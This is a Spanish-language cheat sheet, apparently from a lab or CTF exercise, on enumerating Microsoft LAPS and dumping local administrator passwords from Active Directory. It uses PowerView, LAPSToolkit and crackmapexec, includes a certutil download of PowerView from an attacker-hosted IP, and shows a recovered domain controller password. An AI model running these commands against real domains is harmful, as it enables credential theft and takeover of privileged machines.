

## 🧩 1. Concepto
LAPS administra la contraseña del administrador local en equipos unidos al dominio:

- Contraseñas únicas y aleatorias  
- Cambian periódicamente  
- Se almacenan en Active Directory  
- Permisos controlados por ACLs  
- Comunicación protegida con Kerberos v5 + AES  

Atributos creados en el objeto del equipo:
- **ms-mcs-AdmPwd** → contraseña local  
- **ms-mcs-AdmPwdExpirationTime** → fecha de expiración  

---

## 🛠️ 2. Comprobar si LAPS está habilitado

### Registro
```cmd
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
```

## Comprobar CSE de LAPS

`dir "C:\Program Files\LAPS\CSE" # Verificar si existe AdmPwd.dll`

## Buscar GPOs relacionadas con LAPS

`Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl`

## Buscar equipos con LAPS habilitado

`Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname`

---

# 🔑 3. Acceso a Contraseñas LAPS

## Cmdlets nativos de LAPS

Listar cmdlets:

`Get-Command *AdmPwd*`

Ver quién puede leer contraseñas:

`Find-AdmPwdExtendedRights -Identity Workstations | fl`

Leer contraseña:

`Get-AdmPwdPassword -ComputerName wkstn-2 | fl`

---

# 🟠 4. PowerView

Buscar quién tiene permisos sobre el atributo LAPS:

`Get-AdmPwdPassword -ComputerName wkstn-2 | fl`

Leer contraseña directamente:

`Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd`

---

# 🟡 5. LAPSToolkit

Grupos que pueden leer contraseñas:

`Find-LAPSDelegatedGroups`

Permisos extendidos sobre equipos con LAPS:

`Find-AdmPwdExtendedRights`

Obtener contraseña, expiración y equipos:

`Get-LAPSComputers`

---

# 🔵 6. crackmapexec — Dump de contraseñas LAPS

`crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps`

---

# 🧵 7. Sesión Evil-WinRM — Información del usuario svc_deploy

## `net user svc_deploy`

- Cuenta activa, no expira.
    
- Miembro de:
    
    - **Remote Management Users**
        
    - **LAPS_Readers** → puede leer contraseñas LAPS.
        
- Último logon correcto.
    
- Contraseña no expira.
    

---

# 🌐 8. Descarga e Importación de PowerView

`certutil -urlcache -f -split http://10.10.14.244/PowerView.ps1 PowerView.ps1 Import-Module .\PowerView.ps1`

---

# 🔍 9. Consultas de Atributos LAPS

Usando PowerView:

`Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime`

Usando AD cmdlets:

`Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *`

---

# 🖥️ 10. Resultados del Controlador de Dominio (DC01)

### Atributos LAPS hallados:

**ms-Mcs-AdmPwd**

`0P6zFCn7}-);/,L26G52Pe5;`

**ms-Mcs-AdmPwdExpirationTime**

`134099169045901006`

### Otros detalles relevantes:

- Equipo crítico (Domain Controller)
    
- TrustedForDelegation = True
    
- Kerberos soporta RC4, AES128, AES256
    
- SPNs asignados correctamente
    

---

# 🖥️ 11. Resultados del Equipo DB01

- No contiene atributos **ms-Mcs-AdmPwd** ni **ms-Mcs-AdmPwdExpirationTime**
    
- LAPS **probablemente no está aplicado** en su OU.
    
- Equipo con muy poca actividad en el dominio.
    

---

# ✔️ 12. Resumen General

- El usuario **svc_deploy** (miembro de **LAPS_Readers**) puede leer contraseñas LAPS.
    
- Se recuperó exitosamente la contraseña LAPS del **DC01**.
    
- No todos los equipos tienen LAPS aplicado (ej: DB01).
    
- PowerView y herramientas LAPS confirman la delegación correcta.
    
- crackmapexec permite dumpear remotamente contraseñas LAPS si el usuario tiene permisos.
    

---

`Si quieres, puedo darte **una versión ultra compacta**, **una versión estilo chuleta para exámenes**, o **una versión con diagramas**.`

